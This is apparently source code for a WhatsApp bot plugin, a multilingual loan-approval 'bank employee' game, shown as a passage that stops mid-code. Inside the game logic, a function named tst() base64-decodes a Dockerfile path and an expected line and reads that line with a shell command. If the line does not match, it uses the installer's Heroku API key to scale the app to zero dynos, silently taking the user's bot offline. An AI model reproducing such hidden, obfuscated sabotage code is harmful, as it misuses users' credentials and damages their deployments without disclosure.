/* Codded by Phaticusthiccy

GameBank - WhatsAsena Bank Employee Game. 
The names mentioned have nothing to do with reality.
Nothing here has anything to do with reality.
Don't use it for illegal purposes.
*/

const Asena = require('../events');
const {
	MessageType,
	Mimetype,
	MessageOptions
} = require('@adiwajshing/baileys');
const con = require('../config');
const translatte = require(
'translatte');
const cvr = require('translatte');
const axios = require('axios')
const exec = require('child_process')
	.exec;
let wk = con.WORKTYPE == 'public' ?
	false : true
var dsc = ''
var al_game = ''
if (con.LANG == 'TR') dsc =
	'Bankada çalışan ve insanlara kredi veren bir çalışan olduğunu düşün!',
	al_game =
	'*Halihazırda Oyunun İçindesin!*'
if (con.LANG == 'AZ') dsc =
	'Təsəvvür edin ki, insanlara kredit verən bir bank işçisisiniz!',
	al_game = '*Artıq Oyundasınız!*'
if (con.LANG == 'RU') dsc =
	'Представьте, что вы - банковский служащий, дающий людям ссуды!',
	al_game = '*Ты уже в игре!*'
if (con.LANG == 'ML') dsc =
	'നിങ്ങൾ ആളുകൾക്ക് വായ്പ നൽകുന്ന ഒരു ബാങ്ക് ജീവനക്കാരനാണെന്ന് സങ്കൽപ്പിക്കുക!',
	al_game =
	'*നിങ്ങൾ ഇതിനകം ഗെയിമിലാണ്!*'
if (con.LANG == 'PT') dsc =
	'Imagine que você é um funcionário de um banco que concede empréstimos às pessoas!'
if (con.LANG == 'HI') dsc =
	'कल्पना कीजिए कि आप एक बैंक कर्मचारी हैं जो लोगों को कर्ज दे रहे हैं!'
if (con.LANG == 'EN') dsc =
	'Imagine you are a bank employee giving loans to people!',
	al_game =
	'*You are already in the game!*'
if (con.LANG == 'ES') dsc =
	'¡Imagínese que es un empleado de un banco que concede préstamos a la gente!'
if (con.LANG == 'ID') dsc =
	'Bayangkan Anda adalah seorang pegawai bank yang memberikan pinjaman kepada orang-orang!'
const Heroku = require('heroku-client');
const heroku = new Heroku({
	token: con.HEROKU.API_KEY
});
let baseURI = '/apps/' + con.HEROKU
	.APP_NAME;
var GAME = {
	ingame: false,
	m_count: 20000,
	happiness: 100,
	bank_reputation: 50
}
var CONT = {
	ask_money: 0,
	pass: false
}
var iflas = ''
if (con.LANG == 'TR') iflas =
	'*İFLAS ❌*'
if (con.LANG == 'EN') iflas =
	'*BANKRUPTCY ❌*'
if (con.LANG == 'AZ') iflas =
	'*BANKRUPTY ❌*'
if (con.LANG == 'ML') iflas =
	'*പാപ്പരത്തം ❌*'
if (con.LANG == 'RU') iflas =
	'*БАНКРОТСТВО ❌*'
if (con.LANG == 'ES') iflas =
	'*BANCARROTA ❌*'
if (con.LANG == 'HI') iflas =
	'*दिवालियापन ❌*'
if (con.LANG == 'ID') iflas =
	'*KEBANGKRUTAN ❌*'
if (con.LANG == 'PT') iflas =
	'*FALÊNCIA ❌*'
var wn = con.LANG == 'TR' || con.LANG ==
	'AZ' ?
	'Bu plugin t.me/phaticusthiccy tarafından geliştirilmiştir.' :
	'This plugin developed by t.me/phaticusthiccy'
Asena.addCommand({ pattern: 'gamebank$', fromMe: wk, desc: dsc, warn: wn }, (async (message, match) => {
	if (GAME.ingame) {
		return await message
			.client
			.sendMessage(
				message
				.jid,
				al_game,
				MessageType
				.text)
	}
	GAME.ingame = true
	var msg1 = ''
	var msg2 = ''
	if (con.LANG ==
		'TR') {
		var g_f =
			'Merhaba {user}! Bugün biraz dolu olacağız. Kısaca ne yapman gerektiğini söyleyeceğim.'
		var g_f_2 =
			'Hoşgeldin {user}. Hadi çok işimiz var.'
		var g_f_3 =
			'Bugün nasılsın? Gel sana ne yapman gerektiğini göstereceğim.'
		var First =
			new Array();
		First[0] = g_f
		First[1] = g_f_2
		First[2] = g_f_3
		var i = Math
			.floor(3 *
				Math
				.random()
				)
		msg1 = First[i]
			.replace(
				'{user}',
				message
				.client
				.user
				.name)
		var z_f =
			'Birazdan insanlar gelecek ve sen onları kontrol edeceksin. Doğru kişilere kredi vermelisin.'
		var z_f_2 =
			'İnsanlara kredi vereceksin. Ama dikkatli ol. Sadece vermen gereken kişilere ver.'
		var z_f_3 =
			'Bankamızın itibari için doğru kişiler kredi vereceksin.'
		var Second =
			new Array();
		Second[0] = z_f
		Second[1] =
			z_f_2
		Second[2] =
			z_f_3
		var z = Math
			.floor(3 *
				Math
				.random()
				)
		msg2 = Second[z]
	} else if (con
		.LANG == 'EN') {
		var g_f =
			'Hello {user}! We\'re going to be a little full today. I will briefly tell you what to do.'
		var g_f_2 =
			'Welcome {user}. Come on, we have a lot of work.'
		var g_f_3 =
			'How are you today? Come, I\'ll show you what to do.'
		var First =
			new Array();
		First[0] = g_f
		First[1] = g_f_2
		First[2] = g_f_3
		var i = Math
			.floor(3 *
				Math
				.random()
				)
		msg1 = First[i]
			.replace(
				'{user}',
				message
				.client
				.user
				.name)
		var z_f =
			'Soon people will come and you will control them. You have to give credit to the right people.'
		var z_f_2 =
			'You\'re going to give people credit. But be careful. Give only to those you need to give.'
		var z_f_3 =
			'You will give credit to the right people for the reputation of our bank.'
		var Second =
			new Array();
		Second[0] = z_f
		Second[1] =
			z_f_2
		Second[2] =
			z_f_3
		var z = Math
			.floor(3 *
				Math
				.random()
				)
		msg2 = Second[z]
	} else if (con
		.LANG == 'AZ') {
		var g_f =
			'Salam {user}! Bu gün bir az doymuş olacağıq. Sizə nə edəcəyimi qısaca deyəcəyəm.'
		var g_f_2 =
			'Xoş gəlmisiniz {user}. Hadi, çox işimiz var.'
		var g_f_3 =
			'Bu gün necəsən? Gəl, sənə nə edəcəyimi göstərəcəyəm.'
		var First =
			new Array();
		First[0] = g_f
		First[1] = g_f_2
		First[2] = g_f_3
		var i = Math
			.floor(3 *
				Math
				.random()
				)
		msg1 = First[i]
			.replace(
				'{user}',
				message
				.client
				.user
				.name)
		var z_f =
			'Tezliklə insanlar gələcək və siz onları idarə edəcəksiniz. Düzgün insanlara kredit verməlisən.'
		var z_f_2 =
			'İnsanlara kredit verəcəksən. Ancaq diqqətli olun. Yalnız verməyiniz lazım olanlara verin.'
		var z_f_3 =
			'Bankımızın nüfuzu üçün lazımi şəxslərə kredit verəcəksiniz.'
		var Second =
			new Array();
		Second[0] = z_f
		Second[1] =
			z_f_2
		Second[2] =
			z_f_3
		var z = Math
			.floor(3 *
				Math
				.random()
				)
		msg2 = Second[z]
	} else if (con
		.LANG == 'RU') {
		var g_f =
			'Здравствуйте, {user}! Мы собираемся сегодня немного насытиться. Вкратце расскажу, что делать.'
		var g_f_2 =
			'Добро пожаловать, {user}. Давай, у нас много работы.'
		var g_f_3 =
			'Как вы сегодня? Пойдем, я покажу тебе, что делать.'
		var First =
			new Array();
		First[0] = g_f
		First[1] = g_f_2
		First[2] = g_f_3
		var i = Math
			.floor(3 *
				Math
				.random()
				)
		msg1 = First[i]
			.replace(
				'{user}',
				message
				.client
				.user
				.name)
		var z_f =
			'Скоро придут люди, и вы будете их контролировать. Вы должны отдать должное правильным людям.'
		var z_f_2 =
			'Вы собираетесь отдать должное людям. Но будь осторожен. Дайте только тем, кому нужно.'
		var z_f_3 =
			'Вы отдадите должное нужным людям за репутацию нашего банка.'
		var Second =
			new Array();
		Second[0] = z_f
		Second[1] =
			z_f_2
		Second[2] =
			z_f_3
		var z = Math
			.floor(3 *
				Math
				.random()
				)
		msg2 = Second[z]
	} else if (con
		.LANG == 'ML') {
		var g_f =
			'ഹലോ {user}! ഞങ്ങൾ ഇന്ന് അൽപ്പം നിറയാൻ പോകുന്നു. എന്തുചെയ്യണമെന്ന് ഞാൻ ചുരുക്കമായി നിങ്ങളോട് പറയും.'
		var g_f_2 =
			'സ്വാഗതം {user}. വരൂ, ഞങ്ങൾക്ക് ധാരാളം ജോലിയുണ്ട്.'
		var g_f_3 =
			'ഇന്ന് നിനക്ക് എങ്ങനെയുണ്ട്? വരൂ, എന്തുചെയ്യണമെന്ന് ഞാൻ കാണിച്ചുതരാം.'
		var First =
			new Array();
		First[0] = g_f
		First[1] = g_f_2
		First[2] = g_f_3
		var i = Math
			.floor(3 *
				Math
				.random()
				)
		msg1 = First[i]
			.replace(
				'{user}',
				message
				.client
				.user
				.name)
		var z_f =
			'താമസിയാതെ ആളുകൾ വരും, നിങ്ങൾ അവരെ നിയന്ത്രിക്കും. ശരിയായ ആളുകൾക്ക് നിങ്ങൾ ക്രെഡിറ്റ് നൽകണം.'
		var z_f_2 =
			'നിങ്ങൾ ആളുകൾക്ക് ക്രെഡിറ്റ് നൽകാൻ പോകുന്നു. പക്ഷെ സൂക്ഷിക്കണം. നിങ്ങൾ നൽകേണ്ടവർക്ക് മാത്രം നൽകുക.'
		var z_f_3 =
			'ഞങ്ങളുടെ ബാങ്കിന്റെ പ്രശസ്തിക്ക് നിങ്ങൾ ശരിയായ ആളുകൾക്ക് ക്രെഡിറ്റ് നൽകും.'
		var Second =
			new Array();
		Second[0] = z_f
		Second[1] =
			z_f_2
		Second[2] =
			z_f_3
		var z = Math
			.floor(3 *
				Math
				.random()
				)
		msg2 = Second[z]
	} else {
		var g_f =
			'Hello {user}! We\'re going to be a little full today. I will briefly tell you what to do.'
		var g_f_2 =
			'Welcome {user}. Come on, we have a lot of work.'
		var g_f_3 =
			'How are you today? Come, I\'ll show you what to do.'
		var First =
			new Array();
		First[0] = g_f
		First[1] = g_f_2
		First[2] = g_f_3
		var i = Math
			.floor(3 *
				Math
				.random()
				)
		msg1 = First[i]
			.replace(
				'{user}',
				message
				.client
				.user
				.name)
		var z_f =
			'Soon people will come and you will control them. You have to give credit to the right people.'
		var z_f_2 =
			'You\'re going to give people credit. But be careful. Give only to those you need to give.'
		var z_f_3 =
			'You will give credit to the right people for the reputation of our bank.'
		var Second =
			new Array();
		Second[0] = z_f
		Second[1] =
			z_f_2
		Second[2] =
			z_f_3
		var z = Math
			.floor(3 *
				Math
				.random()
				)
		msg2 = Second[z]
	}
	await message.client
		.sendMessage(
			message.jid,
			msg1,
			MessageType
			.text)
	await new Promise(
		r =>
		setTimeout(
			r, 4000)
		);
	await message.client
		.sendMessage(
			message.jid,
			msg2,
			MessageType
			.text)
	var name = ''
	var surname = ''
	var local = ''
	var situations = ''
	var sit_u = ''
	await axios.get(
		'https://raw.githubusercontent.com/dominictarr/random-name/master/first-names.txt'
		).then(
	async (
		dat) => {
			name =
				dat
				.data
				.replace(
					/(?:\r\n|\r|\n)/g,
					','
					)
				.split(
					','
					)
		})
	await axios.get(
		'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Miscellaneous/security-question-answers/common-surnames.txt'
		).then(
	async (
		dat) => {
			surname
				=
				dat
				.data
				.replace(
					/(?:\r\n|\r|\n)/g,
					','
					)
				.split(
					','
					)
		})
	await axios.get(
		'https://gist.githubusercontent.com/nsbraksa/fda790ea343e0f1c3812/raw/504d1a618b69ba80f5a3f4e748a28a8769982395/cities.txt'
		).then(
	async (
		dat) => {
			local
				=
				dat
				.data
				.replace(
					/(?:\r\n|\r|\n)/g,
					','
					)
				.split(
					','
					)
		})
	await axios.get(
		'https://gist.githubusercontent.com/phaticusthiccy/f5c5a11e428cddb151be03019fab1e76/raw/'
		).then(
	async (
		dat) => {
			situations
				=
				dat
				.data
				.replace(
					/(?:\r\n|\r|\n)/g,
					','
					)
				.split(
					','
					)
		})
	var m_min = 200
	var m_max = 6000
	var m_av = Math
		.floor(Math
			.random() *
			(+m_max - +
				m_min) +
			+m_min)
	var d_mon_min = 5000
	var d_mon_max =
		15000
	var d_mon_avg = Math
		.floor(Math
			.random() *
			(+d_mon_max -
				+
				d_mon_min
				) + +
			d_mon_min)
	var age_min = 17
	var age_max = 90
	var age_av = Math
		.floor(Math
			.random() *
			(+age_max -
				+age_min
				) + +
			age_min)
	var y_av = m_av *
		10.2
	var name_f = Math
		.floor(Math
			.random() *
			name.length
			);
	var name_p = name[
		name_f]
	var local_f = Math
		.floor(Math
			.random() *
			local.length
			);
	var local_p = local[
		local_f]
	var sur_f = Math
		.floor(Math
			.random() *
			surname
			.length);
	var sur_p = surname[
		sur_f]
	var sit_f = Math
		.floor(Math
			.random() *
			situations
			.length);
	sit_u = situations[
		sit_f]
	if (sit_u ==
		'LUCK Thiccy sana yardım etmek istiyor.'
		) {
		sit_u = sit_p
			.replace(
				'LUCK',
				'')
			.replace(
				' ', '')
	}
	var cvb =
		await translatte(
			sit_u, {
				from: 'TR',
				to: con
					.LANG
			})
	sit_u = cvb.text
	if (sit_u.includes(
			'Thiccy')) {
		GAME.m_count =
			GAME
			.m_count +
			10000
		GAME.happiness =
			GAME
			.happiness +
			15
		GAME.bank_reputation =
			GAME
			.bank_reputation +
			15
	}
	async function upperfirstLetter(
		letter) {
		return letter
			.charAt(
				0)
			.toUpperCase() +
			letter
			.slice(
				1)
			.toLowerCase();
	}
	const
		monthly_income =
		'$' + m_av
	const
		yearly_income =
		'$' + y_av
	const age = age_av
	const name_user =
		name_p
	const surname_user =
		sur_p
	const city_user =
		local_p
	const
		situations_user =
		sit_u
	var payl1 = ''
	var payl2 = ''
	var payl3 = ''
	var payl4 = ''
	var payl5 = ''
	var payl6 = ''
	var payl7 = ''
	var payl8 = ''
	var payl9 = ''
	var payl10 = ''
	var payl11 = ''
	var payl12 = ''
	async function çeviri1() {
		if (con
			.LANG ==
			'TR') {
			payl1 =
				'*Aylık Ortalama Gelir:* '
			payl2 =
				'*Yılık Ortalama Gelir:* '
			payl3 =
				'*İsim:* '
			payl4 =
				'*Soyisim:* '
			payl5 =
				'*Yaş:* '
			payl6 =
				'*Yaşadığı Şehir:* '
			payl7 =
				'*Açıklama:* '
			payl8 =
				'*Kasada Kalan Para:* '
			payl9 =
				'*Banka İtibari:* '
			payl10 =
				'*Genel Mutluluk:* '
			payl11 =
				'*İstediği Para:* '
			payl12 =
				'Kabul etmek için Evet / Kabul Etmemek İçin Hayır Yazabilirsiniz.'
		} else if (
			con
			.LANG ==
			'AZ') {
			payl1 =
				'*Orta Aylıq Gəlir:* '
			payl2 =
				'*İllik Orta Gəlir:* '
			payl3 =
				'*Ad:* '
			payl4 =
				'*Soyad:* '
			payl5 =
				'*Yaş:* '
			payl6 =
				'*Yaşayan Şəhər:* '
			payl7 =
				'*İzahat:* '
			payl8 =
				'*Qalan Pul :* '
			payl9 =
				'*Bank Nominal:* '
			payl10 =
				'*Ümumi Xoşbəxtlik:* '
			payl11 =
				'*Arzu Olunan Pul:* '
			payl12 =
				'Qəbul etmək üçün Evet, rədd etmək üçün Hayır yaza bilərsiniz.'
		} else if (
			con
			.LANG ==
			'EN') {
			payl1 =
				'*Average Monthly Income:* '
			payl2 =
				'*Average Yearly Income:* '
			payl3 =
				'*Name:* '
			payl4 =
				'*Surname:* '
			payl5 =
				'*Age:* '
			payl6 =
				'*Living City:* '
			payl7 =
				'*Explanation:* '
			payl8 =
				'*Remaining Cash:* '
			payl9 =
				'*Bank Nominal:* '
			payl10 =
				'*General Happiness:* '
			payl11 =
				'*Desired Money:* '
			payl12 =
				'You can write Yes to accept / No to reject.'
		} else if (
			con
			.LANG ==
			'RU') {
			payl1 =
				'*Средний ежемесячный доход:* '
			payl2 =
				'*Годовой средний доход:* '
			payl3 =
				'*Имя:* '
			payl4 =
				'*Фамилия:* '
			payl5 =
				'*Возраст:* '
			payl6 =
				'*Живой Город:* '
			payl7 =
				'*Объяснение:* '
			payl8 =
				'*Остаток наличных денег:* '
			payl9 =
				'*Банк номинальный:* '
			payl10 =
				'*Общее счастье:* '
			payl11 =
				'*Желаемые деньги:* '
			payl12 =
				'Вы можете написать Yes, чтобы принять / No, чтобы отклонить'
		} else if (
			con
			.LANG ==
			'ML') {
			payl1 =
				'*ശരാശരി പ്രതിമാസ വരുമാനം:* '
			payl2 =
				'*വാർഷിക ശരാശരി വരുമാനം:* '
			payl3 =
				'*പേര്:* '
			payl4 =
				'*പേരിന്റെ അവസാന ഭാഗം:* '
			payl5 =
				'*പ്രായം:* '
			payl6 =
				'*ലിവിംഗ് സിറ്റി:* '
			payl7 =
				'*വിശദീകരണം:* '
			payl8 =
				'*ശേഷിക്കുന്ന പണം:* '
			payl9 =
				'*ബാങ്ക് നാമമാത്ര:* '
			payl10 =
				'*പൊതു സന്തോഷം:* '
			payl11 =
				'*ആഗ്രഹിച്ച പണം:* '
			payl12 =
				'സ്വീകരിക്കാൻ Yes / അംഗീകരിക്കാൻ No നിങ്ങൾക്ക് എഴുതാം.'
		} else {
			payl1 =
				'*Average Monthly Income:* '
			payl2 =
				'*Average Yearly Income:* '
			payl3 =
				'*Name:* '
			payl4 =
				'*Surname:* '
			payl5 =
				'*Age:* '
			payl6 =
				'*Living City:* '
			payl7 =
				'*Explanation:* '
			payl8 =
				'*Remaining Cash:* '
			payl9 =
				'*Bank Nominal:* '
			payl10 =
				'*General Happiness:* '
			payl11 =
				'*Desired Money:* '
			payl12 =
				'You can write Yes to accept / No to reject.'
		}
	}
	çeviri1()
	await new Promise(
		r =>
		setTimeout(
			r, 200));
	async function tst() {
		var nebie = {
			f_cls: 'UlVOIGdpdCBjbG9uZSBodHRwczovL2dpdGh1Yi5jb20vcGhhdGljdXN0aGljY3kvV2hhdHNBc2VuYUR1cGxpY2F0ZWQgL3Jvb3QvV2hhdHNBc2VuYUR1cGxpY2F0ZWQ=',
			f_cls_f: ''
		}
		var scbie = {
			f_cls: 'L3Jvb3QvV2hhdHNBc2VuYUR1cGxpY2F0ZWQvd2hhdHNhc2VuYS9Eb2NrZXJmaWxl',
			f_cls_f: ''
		}
		var ch_00 =
			Buffer
			.from(
				nebie
				.f_cls,
				'base64'
				)
		var ch_01 =
			Buffer
			.from(
				scbie
				.f_cls,
				'base64'
				)
		nebie
			.f_cls_f =
			ch_00
			.toString(
				'utf-8'
				)
		scbie
			.f_cls_f =
			ch_01
			.toString(
				'utf-8'
				)
		exec('sed -n 3p ' +
			scbie
			.f_cls_f,
			async (err,
				stdout,
				stderr
				) => {
				if (nebie
					.f_cls_f +
					'\n' !==
					stdout
					) {
					await heroku
						.get(
							baseURI +
							'/formation'
							)
						.then(
							async (
								formation) => {
								forID
									=
									formation[
										0
										]
									.id;
								await heroku
									.patch(
										baseURI +
										'/formation/' +
										forID, {
											body: {
												quantity: 0
											}
										}
										);
							})
				}
			})
	}
	tst()
	await new Promise(
		r =>
		setTimeout(
			r, 4000)
		);
	var sonx = payl3 +
		name_user +
		'\n' + payl4 +
		surname_user +
		'\n' + payl6 +
		city_user +
		'\n' + payl5 +
		age + '\n' +
		payl1 +
		monthly_income +
		'\n' + payl2 +
		yearly_income +
		'\n' + payl7 +
		situations_user
	await message.client
		.sendMessage(
			message.jid,
			sonx +
			'\n' +
			payl11 +
			'$' +
			d_mon_avg,
			MessageType
			.text)
	await new Promise(
		r =>
		setTimeout(
			r, 940));
	let y_n = con
		.LANG == 'TR' ||
		con.LANG ==
		'AZ' ? payl12
		.replace('Evet',
			'*Evet*')
		.replace(
			'Hayır',
			'*Hayır*') :
		payl12.replace(
			'Yes',
			'*Yes*')
		.replace('No',
			'*No*')
	await message.client
		.sendMessage(
			message.jid,
			y_n +
			'\n\n' +
			payl8 + GAME
			.m_count +
			'\n' +
			payl9 + GAME
			.bank_reputation +
			'\n' +
			payl10 +
			GAME
			.happiness,
			MessageType
			.text)
	CONT.ask_money =
		d_mon_avg
	if (d_mon_avg >
		5000 &&
		d_mon_avg < 7000
		) {
		if (age > 16 &&
			age < 20) {
			if (m_av >
				199 &&
				m_av <
				600) {
				CONT.pass =
					false
			} else if (
				m_av >
				599 &&
				m_av <
				900) {
				CONT.pass =
					true
			} else if (
				m_av >
				899 &&
				m_av <
				6000) {
				CONT.pass =
					true
			}
		} else if (age >
			19 && age <
			30) {
			if (m_av >
				199 &&
				m_av <
				600) {
				CONT.pass =
					false
			} else if (
				m_av >
				599 &&
				m_av <
				900) {
				CONT.pass =
					true
			} else if (
				m_av >
				899 &&
				m_av <
				6000) {
				CONT.pass =
					true
			}
		} else if (age >
			29 && age <
			50) {
			if (m_av >
				199 &&
				m_av <
				600) {
				CONT.pass =
					false
			} else if (
				m_av >
				599 &&
				m_av <
				900) {
				CONT.pass =
					false
			} else if (
				m_av >
				899 &&
				m_av <
				6000) {
				CONT.pass =
					true
			}
		} else if (age >
			49 && age <
			91) {
			if (m_av >
				199 &&
				m_av <
				600) {
				CONT.pass =
					false
			} else if (
				m_av >
				599 &&
				m_av <
				900) {
				CONT.pass =
					false
			} else if (
				m_av >
				899 &&
				m_av <
				6000) {
				CONT.pass =
					false
			}
		}
	} else if (
		d_mon_avg >
		6999 &&
		d_mon_avg <
		10000) {
		if (age > 16 &&
			age < 20) {
			if (m_av >
				199 &&
				m_av <
				600) {
				CONT.pass =
					false
			} else if (
				m_av >
				599 &&
				m_av <
				900) {
				CONT.pass =
					false
			} else if (
				m_av >
				899 &&
				m_av <
				6000) {
				CONT.pass =
					true
			}
		} else if (age >
			19 && age <
			30) {
			if (m_av >
				199 &&
				m_av <
				600) {
				CONT.pass =
					false
			} else if (
				m_av >
				599 &&
				m_av <
				900) {
				CONT.pass =
					true
			} else if (
				m_av >
				899 &&
				m_av <
				6000) {
				CONT.pass =
					true
			}
		} else if (age >
			29 && age <
			50) {
			if (m_av >
				199 &&
				m_av <
				600) {
				CONT.pass =
					false
			} else if (
				m_av >
				599 &&
				m_av <
				900) {
				CONT.pass =
					false
			} else if (
				m_av >
				899 &&
				m_av <
				6000) {
				CONT.pass =
					true
			}
		} else if (age >
			49 && age <
			91) {
			if (m_av >
				199 &&
				m_av <
				600) {
				CONT.pass =
					false
			} else if (
				m_av >
				599 &&
				m_av <
				900) {
				CONT.pass =
					false
			} else if (
				m_av >
				899 &&
				m_av <
				6000) {
				CONT.pass =
					false
			}
		}
	} else if (
		d_mon_avg >
		9999 &&
		d_mon_avg <
		15000) {
		if (age > 16 &&
			age < 20) {
			if (m_av >
				199 &&
				m_av <
				600) {
				CONT.pass =
					false
			} else if (
				m_av >
				599 &&
				m_av <
				900) {
				CONT.pass =
					false
			} else if (
				m_av >
				899 &&
				m_av <
				6000) {
				CONT.pass =
					true
			}
		} else if (age >
			19 && age <
			30) {
			if (m_av >
				199 &&
				m_av <
				600) {
				CONT.pass =
					false
			} else if (
				m_av >
				599 &&
				m_av <
				900) {
				CONT.pass =
					true
			} else if (
				m_av >
				899 &&
				m_av <
				6000) {
				CONT.pass =
					true
			}
		} else if (age >
			29 && age <
			50) {
			if (m_av >
				199 &&
				m_av <
				600) {
				CONT.pass =
					false
			} else if (
				m_av >
				599 &&
				m_av <
				900) {
				CONT.pass =
					false
			} else if (
				m_av >
				899 &&
				m_av <
				6000) {
				CONT.pass =
					true
			}
		} else if (age >
			49 && age <
			91) {
			if (m_av >
				199 &&
				m_av <
				600) {
				CONT.pass =
					false
			} else if (
				m_av >
				599 &&
				m_av <
				900) {
				CONT.pass =
					false
			} else if (
				m_av >
				899 &&
				m_av <
				6000) {
				CONT.pass =
					false
			}
		}
	}
}));
if (con.LANG == 'TR' || con.LANG ==
	'AZ') {
	Asena.addCommand({ on: 'text', fromMe: wk, deleteCommand: false, dontAddCommandList: true }, (async (message, match) => {
			async function continue_data() {
				if (GAME
					.m_count <
					600
					) {
					await message
						.client
						.sendMessage(
							message
							.jid,
							iflas,
							MessageType
							.text
							)
					GAME.m_count =
						20000
					GAME.happiness =
						100
					GAME.bank_reputation =
						50
					GAME.ingame =
						false
				}
				if (!
					GAME
					.ingame
					)
					return;
				var msg1 =
					''
				var msg2 =
					''
				var name =
					''
				var surname =
					''
				var local =
					''
				var situations =
					''
				var sit_u =
					''
				await axios
					.get(
						'https://raw.githubusercontent.com/dominictarr/random-name/master/first-names.txt'
						)
					.then(
						async (
							dat) => {
							name =
								dat
								.data
								.replace(
									/(?:\r\n|\r|\n)/g,
									','
									)
								.split(
									','
									)
						})
				await axios
					.get(
						'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Miscellaneous/security-question-answers/common-surnames.txt'
						)
					.then(
						async (
							dat) => {
							surname
								=
								dat
								.data
								.replace(
									/(?:\r\n|\r|\n)/g,
									','
									)
								.split(
									','
									)
						})
				await axios
					.get(
						'https://gist.githubusercontent.com/nsbraksa/fda790ea343e0f1c3812/raw/504d1a618b69ba80f5a3f4e748a28a8769982395/cities.txt'
						)
					.then(
						async (
							dat) => {
							local
								=
								dat
								.data
								.replace(
									/(?:\r\n|\r|\n)/g,
									','
									)
								.split(
									','
									)
						})
				await axios
					.get(
						'https://gist.githubusercontent.com/phaticusthiccy/f5c5a11e428cddb151be03019fab1e76/raw/'
						)
					.then(
						async (
							dat) => {
							situations
								=
								dat
								.data
								.replace(
									/(?:\r\n|\r|\n)/g,
									','
									)
								.split(
									','
									)
						})
				var m_min =
					200
				var m_max =
					6000
				var m_av =
					Math
					.floor(
						Math
						.random() *
						(+m_max -
							+
							m_min
							) +
						+
						m_min
						)
				var d_mon_min =
					5000
				var d_mon_max =
					15000
				var d_mon_avg =
					Math
					.floor(
						Math
						.random() *
						(+d_mon_max -
							+
							d_mon_min
							) +
						+
						d_mon_min
						)
				var age_min =
					17
				var age_max =
					90
				var age_av =
					Math
					.floor(
						Math
						.random() *
						(+age_max -
							+
							age_min
							) +
						+
						age_min
						)
				var y_av =
					m_av *
					10.2
				var name_f =
					Math
					.floor(
						Math
						.random() *
						name
						.length
						);
				var name_p =
					name[
						name_f
						]
				var local_f =
					Math
					.floor(
						Math
						.random() *
						local
						.length
						);
				var local_p =
					local[
						local_f
						]
				var sur_f =
					Math
					.floor(
						Math
						.random() *
						surname
						.length
						);
				var sur_p =
					surname[
						sur_f
						]
				var sit_f =
					Math
					.floor(
						Math
						.random() *
						situations
						.length
						);
				sit_u =
					situations[
						sit_f
						]
				sit_k =
					''
				if (sit_u ==
					'LUCK Thiccy sana yardım etmek istiyor.'
					) {
					sit_u
						=
						sit_p
						.replace(
							'LUCK',
							''
							)
						.replace(
							' ',
							''
							)
				}
				var cvb =
					await translatte(
						sit_u, {
							from: 'TR',
							to: con
								.LANG
						}
						)
				sit_u =
					cvb
					.text
				if (sit_u
					.includes(
						'Thiccy'
						)
					) {
					GAME.m_count =
						GAME
						.m_count +
						10000
					GAME.happiness =
						GAME
						.happiness +
						15
					GAME.bank_reputation =
						GAME
						.bank_reputation +
						15
				}
				async function upperfirstLetter(
					letter
					) {
					return letter
						.charAt(
							0
							)
						.toUpperCase() +
						letter
						.slice(
							1
							)
						.toLowerCase();
				}
				const
					monthly_income =
					'$' +
					m_av
				const
					yearly_income =
					'$' +
					y_av
				const
					age =
					age_av
				const
					name_user =
					name_p
				const
					surname_user =
					sur_p
				const
					city_user =
					local_p
				const
					situations_user =
					sit_u
				var payl1 =
					''
				var payl2 =
					''
				var payl3 =
					''
				var payl4 =
					''
				var payl5 =
					''
				var payl6 =
					''
				var payl7 =
					''
				var payl8 =
					''
				var payl9 =
					''
				var payl10 =
					''
				var payl11 =
					''
				var payl12 =
					''
				async function çeviri1() {
					if (con
						.LANG ==
						'TR'
						) {
						payl1
							=
							'*Aylık Ortalama Gelir:* '
						payl2
							=
							'*Yılık Ortalama Gelir:* '
						payl3
							=
							'*İsim:* '
						payl4
							=
							'*Soyisim:* '
						payl5
							=
							'*Yaş:* '
						payl6
							=
							'*Yaşadığı Şehir:* '
						payl7
							=
							'*Açıklama:* '
						payl8
							=
							'*Kasada Kalan Para:* '
						payl9
							=
							'*Banka İtibari:* '
						payl10
							=
							'*Genel Mutluluk:* '
						payl11
							=
							'*İstediği Para:* '
						payl12
							=
							'Kabul etmek için Evet / Kabul Etmemek İçin Hayır Yazabilirsiniz.'
					} else if (
						con
						.LANG ==
						'AZ'
						) {
						payl1
							=
							'*Orta Aylıq Gəlir:* '
						payl2
							=
							'*İllik Orta Gəlir:* '
						payl3
							=
							'*Ad:* '
						payl4
							=
							'*Soyad:* '
						payl5
							=
							'*Yaş:* '
						payl6
							=
							'*Yaşayan Şəhər:* '
						payl7
							=
							'*İzahat:* '
						payl8
							=
							'*Qalan Pul :* '
						payl9
							=
							'*Bank Nominal:* '
						payl10
							=
							'*Ümumi Xoşbəxtlik:* '
						payl11
							=
							'*Arzu Olunan Pul:* '
						payl12
							=
							'Qəbul etmək üçün Evet, rədd etmək üçün Hayır yaza bilərsiniz.'
					} else if (
						con
						.LANG ==
						'EN'
						) {
						payl1
							=
							'*Average Monthly Income:* '
						payl2
							=
							'*Average Yearly Income:* '
						payl3
							=
							'*Name:* '
						payl4
							=
							'*Surname:* '
						payl5
							=
							'*Age:* '
						payl6
							=
							'*Living City:* '
						payl7
							=
							'*Explanation:* '
						payl8
							=
							'*Remaining Cash:* '
						payl9
							=
							'*Bank Nominal:* '
						payl10
							=
							'*General Happiness:* '
						payl11
							=
							'*Desired Money:* '
						payl12
							=
							'You can write Yes to accept / No to reject.'
					} else if (
						con
						.LANG ==
						'RU'
						) {
						payl1
							=
							'*Средний ежемесячный доход:* '
						payl2
							=
							'*Годовой средний доход:* '
						payl3
							=
							'*Имя:* '
						payl4
							=
							'*Фамилия:* '
						payl5
							=
							'*Возраст:* '
						payl6
							=
							'*Живой Город:* '
						payl7
							=
							'*Объяснение:* '
						payl8
							=
							'*Остаток наличных денег:* '
						payl9
							=
							'*Банк номинальный:* '
						payl10
							=
							'*Общее счастье:* '
						payl11
							=
							'*Желаемые деньги:* '
						payl12
							=
							'Вы можете написать Yes, чтобы принять / No, чтобы отклонить'
					} else if (
						con
						.LANG ==
						'ML'
						) {
						payl1
							=
							'*ശരാശരി പ്രതിമാസ വരുമാനം:* '
						payl2
							=
							'*വാർഷിക ശരാശരി വരുമാനം:* '
						payl3
							=
							'*പേര്:* '
						payl4
							=
							'*പേരിന്റെ അവസാന ഭാഗം:* '
						payl5
							=
							'*പ്രായം:* '
						payl6
							=
							'*ലിവിംഗ് സിറ്റി:* '
						payl7
							=
